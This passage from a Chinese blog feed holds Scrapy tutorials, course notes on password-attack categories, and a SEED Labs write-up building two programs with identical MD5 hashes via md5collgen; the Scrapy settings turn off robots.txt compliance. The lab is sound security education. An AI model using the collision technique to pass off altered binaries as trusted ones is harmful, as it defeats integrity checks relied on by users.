class="hljs-params">self, item, spider</span>):<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-comment"># 关闭爬虫时执行，只执行一次。</span><br>    <span class="hljs-comment"># 如果爬虫中间发生异常导致崩溃，close_spider可能也不会执行</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close_spider</span>(<span class="hljs-params">self, spider</span>):<br>        <span class="hljs-comment"># 可以关闭数据库等</span><br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>Scrapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Scrapy基本使用</title>
    <link href="/2023/09/29/Python/Spider/Scrapy/Scrapy%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/09/29/Python/Spider/Scrapy/Scrapy%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="爬虫工程化">1. 爬虫工程化</h1><p>对爬虫的功能进行模块化开发，从而达到可以批量生产的效果。</p><h1 id="scrapy简介">2. Scrapy简介</h1><p>Scrapy是一个快速、高效率的网络爬虫框架，用于抓取web站点并从页面中提取结构化的数据。Scrapy被广泛用于数据挖掘、监测和自动化测试。</p><p>官方文档：<ahref="https://docs.scrapy.org/en/latest/index.html">Scrapy 2.11documentation — Scrapy 2.11.0 documentation</a></p><h1 id="scrapy工作流程">3. Scrapy工作流程</h1><p><strong>基本爬虫工作流程：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309291201611.png"alt="image-20230929093956527" /><figcaption aria-hidden="true">image-20230929093956527</figcaption></figure><p><strong>Scrapy框架工作流程：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309291201612.png"alt="image-20230929093846194" /><figcaption aria-hidden="true">image-20230929093846194</figcaption></figure><ol type="1"><li>引擎：用来处理整个系统的数据流，触发事务。（核心）</li><li>spider：将url封装成request对象，发送给scheduler</li><li>scheduler：得到request对象，进行过滤，压入队列，发送给downloader</li><li>downloader：发送请求，将响应封装成response对象，传递给spider</li><li>spider：进行数据解析（注：若还需要继续爬取，则重复前面几个步骤）</li><li>pipeline：数据持久化存储</li><li>下载器中间件、爬虫中间件</li></ol><h1 id="scrapy安装">4. Scrapy安装</h1><p>使用Anaconda Navigator创建虚拟环境，导入Scrapy包。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309291201614.png"alt="image-20230929100319426" /><figcaption aria-hidden="true">image-20230929100319426</figcaption></figure><p>测试命令：<code>scrapy version</code>，若终端能打印版本号，则说明已安装成功。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309291201615.png"alt="image-20230929100251091" /><figcaption aria-hidden="true">image-20230929100251091</figcaption></figure><h1 id="scrapy实例">5. Scrapy实例</h1><h2 id="创建项目">5.1 创建项目</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># projectName自取，后续操作均在生成的项目根目录下进行</span><br>scrapy startproject projectName<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309291201616.png"alt="image-20230929101145588" /><figcaption aria-hidden="true">image-20230929101145588</figcaption></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看项目根目录下目录结构</span><br>tree /f<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309291201617.png"alt="image-20230929102306107" /><figcaption aria-hidden="true">image-20230929102306107</figcaption></figure><h2 id="生成爬虫">5.2 生成爬虫</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># spiderName,allowed_domains按需设置</span><br>scrapy genspider spiderName allowed_domains<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309291201618.png"alt="image-20230929103444499" /><figcaption aria-hidden="true">image-20230929103444499</figcaption></figure><h2 id="运行项目">5.3 运行项目</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># spiderName为需要运行的爬虫名字</span><br>scrapy crawl spiderName<br></code></pre></td></tr></table></figure><h2 id="配置项目">5.4 配置项目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># settings.py</span><br><br><span class="hljs-comment"># UA伪装，默认没有开启</span><br>USER_AGENT = <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43&quot;</span><br><br><span class="hljs-comment"># 修改值为False，不遵从robots协议，默认值为Ture</span><br>ROBOTSTXT_OBEY = <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 设置日志级别：DEBUG、INFO、WARNING、ERROR、CRITCAL</span><br><span class="hljs-comment"># 需要自己在配置文件中添加</span><br>LOG_LEVEL = <span class="hljs-string">&quot;WARNING&quot;</span><br><br><span class="hljs-comment"># 开启管道，默认被注释</span><br><span class="hljs-comment"># key：管道路径</span><br><span class="hljs-comment"># value：管道优先级（数字越小，优先级越高）</span><br>ITEM_PIPELINES = &#123;<br>   <span class="hljs-string">&quot;game.pipelines.GamePipeline&quot;</span>: <span class="hljs-number">300</span>,<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="基本流程">6. 基本流程</h1><ol type="1"><li>创建项目</li><li>进入项目根目录</li><li>创建爬虫</li><li>修改start_urls</li><li>编写parse(self, response)<ul><li>默认xpath()返回Selector对象，需要进行数据提取。注意：<strong>xpath中不能有tbody标签</strong><ul><li>extract()：返回列表</li><li>extract_first()：返回第一个数据</li></ul></li><li>yield item</li></ul></li><li>在pipeline中完成数据存储</li><li>配置文件中启用管道</li><li>运行爬虫</li></ol>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>Scrapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH3-口令攻击</title>
    <link href="/2023/09/28/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/03%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB/"/>
    <url>/2023/09/28/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/03%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="概述">3.1 概述</h1><h2 id="口令和身份认证">3.1.1 口令和身份认证</h2><ul><li><p>身份认证：用户向计算机系统以一种安全的方式提交自己的身份证明，然后由系统确认用户的身份是否属实，最终拒绝用户或者赋予用户一定的权限。</p></li><li><p>口令认证是身份认证的一种手段。</p></li><li><p>其他认证方式：磁卡或者智能卡认证、基于人的生理特征认证、基于地理位置的认证 。</p></li><li><p>认证过程：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281533483.png"alt="image-20230928144139441" /><figcaption aria-hidden="true">image-20230928144139441</figcaption></figure></li></ul><h2 id="口令攻击的分类">3.1.2 口令攻击的分类</h2><ul><li>口令分类：<ul><li>静态口令</li><li>动态口令：加入不确定因子进行散列</li></ul></li><li>口令攻击分类：<ul><li>针对口令强度的攻击</li><li>针对口令存储的攻击：文件、缓存、数据库</li><li>针对口令传输的攻击：在口令认证交互过程中，利用网络监听非法得到用户传送的口令</li></ul></li></ul><h1 id="针对口令强度的攻击">3.2 针对口令强度的攻击</h1><h2 id="强口令与弱口令">3.2.1 强口令与弱口令</h2><ul><li>较为安全的口令应该不容易被发现规律，并且有足够的长度。</li><li>对长度的要求随应用环境的不同而不同，应该使得攻击者在某个时间段内很难破解</li></ul><h2 id="针对口令强度的攻击-1">3.2.2 针对口令强度的攻击</h2><ul><li><p>强力攻击：穷举法</p></li><li><p>字典攻击：将使用概率较高的口令集中存放在字典文件中，通过不同的变异规则生成猜测字典。强力攻击的进阶版。</p></li><li><p>组合攻击：强力攻击+字典攻击。如：字典单词尾部串接任意个字母和数字。</p></li><li><p>撞库攻击：攻击者通过收集在网络上已泄露的用户名、口令等信息，之后用这些账号和口令尝试批量登录其他网站，最终得到可以登录这些网站的用户账号和口令。一般流程：拖库→洗库→撞库。</p></li><li><p>彩虹表破解：指拿着获取到的hash值通过查询彩虹表找出其原始值的攻击方式。狭义上，彩虹表一般是指以“hash值:原始值”为行组成的文件，如下图所示。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281533484.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure></li></ul><h1 id="针对口令存储的攻击">3.3 针对口令存储的攻击</h1><ul><li><p>不同系统的口令存储位置不同，有些存放在文件中，比如Linux系统的Shadow文件，Windows系统的SAM文件；有些存放在数据库中，比如Oracle数据库账户文件；有些则存放在注册表中，比如Windows平台下的许多应用软件。另外，在身份验证程序运行时，还会将口令或口令的密文加载到内存中，方便进行比较。</p></li><li><p>Linux shadow文件：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281535352.png"alt="image-20230928153443475" /><figcaption aria-hidden="true">image-20230928153443475</figcaption></figure></li><li><p>salt用途：使用salt时，相同的输入可能导致不同的散列。密码散列=单向散列循环（密码||随机字符串）。可以防止字典攻击、彩虹表攻击。</p></li></ul><h1 id="针对口令传输的攻击">3.4 针对口令传输的攻击</h1><h2 id="口令嗅探">3.4.1 口令嗅探</h2><ul><li>如果主机B处于主机A和FTP通信的信道上，就可以“窃听到”合法的用户名及口令。</li><li>802.3以太网是一种使用广播信道的网络，在以太网中所有通信都是广播的。</li><li>网卡侦听模式：<ul><li>广播模式</li><li>组播模式</li><li>普通模式</li><li><strong>混杂模式</strong></li></ul></li></ul><h2 id="键盘记录">3.4.2 键盘记录</h2><ul><li>硬件截获：修改主机的键盘接口。</li><li>软件截获：监视操作系统处理键盘输入的接口，将来自键盘的数据记录下来。</li></ul><h2 id="网络钓鱼">3.4.3 网络钓鱼</h2><p>“网络钓鱼（Phishing）”就是攻击者利用欺骗性的电子邮件和伪造的Web站点，骗取用户输入口令以及其他身份敏感信息。</p><h2 id="重放攻击">3.4.4 重放攻击</h2><ul><li>指攻击者记录下当前的通讯流量，以后在适当的时候重发给通讯的某一方，达到欺骗的目的。</li><li>分类：简单重放、反向重放。</li></ul><p>参考教程：</p><ol type="1"><li>https://www.cnblogs.com/lsdb/p/10038835.html</li></ol>]]></content>
    
    
    <categories>
      
      <category>网络攻防技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MD5 Collision Attack</title>
    <link href="/2023/09/27/SEED-LABS/Cryptography/MD5-Collision-Attack/"/>
    <url>/2023/09/27/SEED-LABS/Cryptography/MD5-Collision-Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="introduction">1. Introduction</h1><p>安全的单向散列函数需要满足两个属性：<strong>单向属性和抗碰撞属性</strong>。单向属性确保在给定哈希值h 的情况下，要找到一个输入 M，使 hash(M) =h，在计算上是不可行的；抗碰撞属性确保要找到两个不同的输入 M1 和 M2，使hash(M1) = hash(M2)，在计算上是不可行的。</p><p>几种广泛使用的单向散列函数都难以保持抗碰撞特性。在 CRYPTO 2004的尾声会议上，王小云和合著者演示了针对 MD5 的碰撞攻击。2017 年 2月，阿姆斯特丹 CWI 和谷歌研究院公布了 SHAttered 攻击，它打破了 SHA-1的抗碰撞特性。虽然很多学生不难理解单向属性的重要性，但他们不容易理解为什么需要抗碰撞属性，以及这些攻击会造成什么影响。</p><p>本实验的学习目标是让学生真正了解碰撞攻击的影响，并亲眼看到如果一个广泛使用的单向散列函数的抗碰撞特性被破坏，会造成什么样的损失。为了实现这一目标，学生需要对MD5哈希函数发起实际的碰撞攻击。利用这些攻击，学生应该能够创建两个共享相同MD5 哈希值但行为完全不同的程序。本实验室涵盖以下描述的多个主题：</p><ul><li>单向散列函数 MD5</li><li>抗碰撞特性</li><li>碰撞攻击</li></ul><p><strong>附：MD5算法流程</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032637.png"alt="MD5流程" /><figcaption aria-hidden="true">MD5流程</figcaption></figure><h1 id="lab-tasks">2. Lab Tasks</h1><h2 id="task-1generating-two-different-files-with-the-same-md5-hash">2.1Task 1：Generating Two Different Files with the Same MD5 Hash</h2><p>在这项任务中，我们将生成两个具有相同 MD5哈希值的不同文件。这两个文件的开头部分必须相同，即共享相同的前缀。我们可以使用md5collgen程序来实现这一目标，该程序允许我们提供一个包含任意内容的前缀文件。该程序的工作原理如图1 所示。下面的命令为给定的前缀文件 prefix.txt 生成两个输出文件 out1.bin和 out2.bin：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ md5collgen -p prefix.txt -o out1.bin out2.bin<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071003576.png"alt="image-20231207091446950" /><figcaption aria-hidden="true">image-20231207091446950</figcaption></figure><p>我们可以使用 diff 命令检查输出文件是否不同。我们还可以使用 md5sum命令检查每个输出文件的 MD5 哈希值。请参阅以下命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ diff out1.bin out2.bin<br>$ <span class="hljs-built_in">md5sum</span> out1.bin<br>$ <span class="hljs-built_in">md5sum</span> out2.bin<br></code></pre></td></tr></table></figure><p>由于 out1.bin 和 out2.bin是二进制文件，我们无法使用文本查看器程序（如 <code>cat</code> 或<code>more</code>）来查看它们；我们需要使用二进制编辑器来查看（和编辑）它们。我们已经在虚拟机中安装了一个名为<code>bless</code>的十六进制编辑器软件。请使用这种编辑器查看这两个输出文件，并描述你的观察结果。此外，您还应回答以下问题：</p><ul><li>问题 1.如果前缀文件的长度不是 64 的倍数，会发生什么情况？</li><li>问题 2.创建一个 64字节的前缀文件，再次运行碰撞工具，看看会发生什么。</li><li>问题 3.md5collgen 生成的数据（128字节）在两个输出文件中是否完全不同？请指出所有不同的字节。</li></ul><p><strong>实验流程：</strong></p><ul><li><p><strong>Question 1.</strong></p><ol type="1"><li><p>步骤1：生成小于64字节（或其他不是64字节倍数）的前缀文件；步骤2：指定前缀，生成两个具有相同MD5哈希值的不同文件；步骤3：检查输出文件是否相同；步骤4&amp;步骤5：分别检查每个输出文件的MD5 哈希值。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032640.png"alt="image-20230927195104857" /><figcaption aria-hidden="true">image-20230927195104857</figcaption></figure></li><li><p>发现两个输出文件不同，但它们的MD5哈希值相同。</p></li><li><p>使用十六进制编辑器软件bless对比分析两个输出文件，命令格式：<code>bless fileName</code>。结论：前64（0x40）字节使用了空字符填充；剩余部分内容大致相同，仅有少数字节不同，如下图中勾选部分。填充原因：MD5处理大小为64字节的块。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032641.png"alt="image-20230927195612726" /><figcaption aria-hidden="true">image-20230927195612726</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032642.png"alt="image-20230927195637940" /><figcaption aria-hidden="true">image-20230927195637940</figcaption></figure></li></ol></li></ul><p>​</p><ul><li><p><strong>Question 2.</strong></p><ol type="1"><li><p>步骤1：生成64字节的前缀文件（末尾会有一个换行符，所以实际输入字符为63个）；步骤2：指定前缀，生成两个具有相同MD5哈希值的不同文件；步骤3：检查输出文件是否相同；步骤4：分别检查每个输出文件的MD5 哈希值。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032643.png"alt="image-20230927195753720" /><figcaption aria-hidden="true">image-20230927195753720</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032644.png"alt="image-20230927195811834" /><figcaption aria-hidden="true">image-20230927195811834</figcaption></figure></li><li><p>同样发现两个输出文件不同，但它们的MD5哈希值相同。</p></li><li><p>使用十六进制编辑器软件bless对比分析两个输出文件。发现此次输出文件中未进行补零；同样，前缀部分完全相同，剩余部分除部分字节外大致相同。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032645.png"alt="image-20230927195827718" /><figcaption aria-hidden="true">image-20230927195827718</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032646.png"alt="image-20230927195848313" /><figcaption aria-hidden="true">image-20230927195848313</figcaption></figure></li></ol></li></ul><p>​</p><ul><li><strong>Question 3.</strong>没有完全不同。Question1中有5个字节不同，Question2中有6个字节不同。不同之处为上述图中勾画部分。</li></ul><h2 id="task-2-understanding-md5s-property">2.2 Task 2: UnderstandingMD5’s Property</h2><p>在本任务中，我们将尝试了解 MD5算法的一些特性。这些特性对于我们在本实验室中开展下一步任务非常重要。MD5是一种相当复杂的算法，但从高层来看，它并不复杂。如图 2 所示，MD5将输入数据分成 64 字节的数据块，然后在这些数据块上迭代计算哈希值。MD5算法的核心是一个压缩函数，它有两个输入，一个是 64字节的数据块，另一个是上一次迭代的结果。压缩函数会产生一个 128 位的IHV，即"中间哈希值"；然后将此输出输入下一次迭代。如果当前迭代是最后一次迭代，IHV将是最终哈希值。 第一次迭代的 IHV 输入（IHV0）是一个固定值。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312070922911.png"alt="image-20231207092156846" /><figcaption aria-hidden="true">image-20231207092156846</figcaption></figure><p>根据 MD5 的工作原理，我们可以推导出 MD5 算法的以下属性：给定两个输入M 和 N，如果 MD5(M) = MD5(N)，即 M 和 N 的 MD5哈希值相同，那么对于任意输入 T，MD5(M || T) = MD5(N ||T)，其中||表示连接。</p><p>也就是说，如果输入 M 和 N 具有相同的哈希值，那么给它们添加相同的后缀T 就会得到两个具有相同哈希值的输出。这一特性不仅适用于 MD5哈希算法，也适用于许多其他哈希算法。在本任务中，你的任务是设计一个实验来证明MD5 的这一特性。</p><p>您可以使用 cat命令将两个文件（二进制文件或文本文件）连接成一个文件。下面的命令将文件 1的内容与文件 2 的内容连接起来，并将结果放到文件 3 中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> file1 file2 &gt; file3<br></code></pre></td></tr></table></figure><p><strong>实验流程：</strong></p><ol type="1"><li>步骤1：构造前缀文件；步骤2：指定前缀，生成两个具有相同 MD5哈希值的文件；步骤3：检查输出文件是否相同；步骤4：构造后缀文件；步骤5&amp;步骤6：分别使用cat命令对两个文件（生成的输出文件+后缀文件）进行拼接；步骤7：查看各个文件MD5哈希值。</li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032648.png"alt="image-20230927200103119" /><figcaption aria-hidden="true">image-20230927200103119</figcaption></figure><ol start="2" type="1"><li>结论：观察得到两个具有不同内容，但MD5哈希值相同的文件，拼接上同一个后缀之后，它们的MD5哈希值仍然相同。因此，给定两个输入M，N，如果MD5(M)= MD5(N)，那么对于任何输入T，MD5(M || T) = MD5(N ||T)，该属性得证。<strong>注意：拼接后缀后的哈希值与原哈希值不同。</strong></li></ol><h2id="task-3-generating-two-executable-files-with-the-same-md5-hash">2.3Task 3: Generating Two Executable Files with the Same MD5 Hash</h2><p>在这项任务中，您将得到以下 C程序。你的任务是创建两个不同版本的程序，使其 xyz数组的内容不同，但可执行文件的哈希值相同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> xyz[<span class="hljs-number">200</span>] = &#123;<br><span class="hljs-comment">/* The actual contents of this array are up to you */</span><br>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">200</span>; i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x&quot;</span>, xyz[i]);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>您可以选择在源代码层面进行处理，即生成上述 C程序的两个版本，使其在编译后的可执行文件具有相同的 MD5哈希值。不过，直接在二进制级别上工作可能更容易。你可以在 xyz数组中放入一些任意值，将上述代码编译成二进制。然后使用十六进制编辑器直接在二进制文件中修改xyz 数组的内容。</p><p>要在二进制文件中找到数组内容的存储位置并不容易。不过，如果我们在数组中填入一些固定值，就可以很容易地在二进制中找到它们。例如，下面的代码在数组中填充了0x41，这是字母 A 的 ASCII 值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> xyz[<span class="hljs-number">200</span>] = &#123;<br><span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>,<br><span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>,<br><span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>,<br>... (omitted) ...<br><span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>指导原则：在数组内部，我们可以找到两个位置，从这里可以将可执行文件分为三部分：前缀、128字节区域和后缀。前缀的长度必须是 64 字节的倍数。文件划分示意图见图3。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312070929704.png"alt="image-20231207092912638" /><figcaption aria-hidden="true">image-20231207092912638</figcaption></figure><p>我们可以在前缀上运行 md5collgen，生成两个具有相同 MD5 哈希值的输出。让我们用 P 和 Q 表示这些输出的第二部分（各有 128个字节）（即前缀后的部分）。因此，我们可以得到以下结果：</p><p><code>MD5 (prefix || P) = MD5 (prefix || Q)</code></p><p>根据 MD5的属性，我们可以知道，如果在上述两个输出中添加相同的后缀，结果数据也将具有相同的哈希值。基本上，对于任何后缀都是如此：</p><p><code>MD5 (prefix || P || suffix) = MD5 (prefix || Q || suffix)</code></p><p>因此，我们只需用 P 和 Q 替换数组的 128个字节（在两个分割点之间），就能创建两个具有相同哈希值的二进制程序。它们的结果是不同的，因为它们各自打印出了内容不同的数组。</p><p>工具：你可以使用 bless查看二进制可执行文件，并找到数组的位置。在分割二进制文件时，我们可以使用一些工具从特定位置分割文件。head和 tail 命令就是这类有用的工具。下面我们举三个例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">head</span> -c 3200 a.out &gt; prefix<br>$ <span class="hljs-built_in">tail</span> -c 100 a.out &gt; suffix<br>$ <span class="hljs-built_in">tail</span> -c +3300 a.out &gt; suffix<br></code></pre></td></tr></table></figure><p>上述第一条命令将 a.out 的前 3200 个字节保存到前缀。第二条命令将 a.out的最后 100 个字节保存到 suffix。第三条命令将从第 3300 个字节到文件 a.out末尾的数据保存到 suffix中。通过这两条命令，我们可以将二进制文件从任意位置分割成若干块。如果需要将某些片段粘合在一起，我们可以使用cat 命令。</p><p>如果使用 bless将一个二进制文件中的数据块复制并粘贴到另一个文件中，菜单项 "编辑 -&gt;选择范围"非常方便，因为您可以使用起点和范围选择数据块，而不用手动计算选择了多少字节。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>根据实验说明编写demo.c程序，并进行编译<code>gcc -o demo.out demo.c</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> xyz[<span class="hljs-number">200</span>] = &#123;<br><span class="hljs-comment">/* The actual contents of this array are up to you */</span><br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span 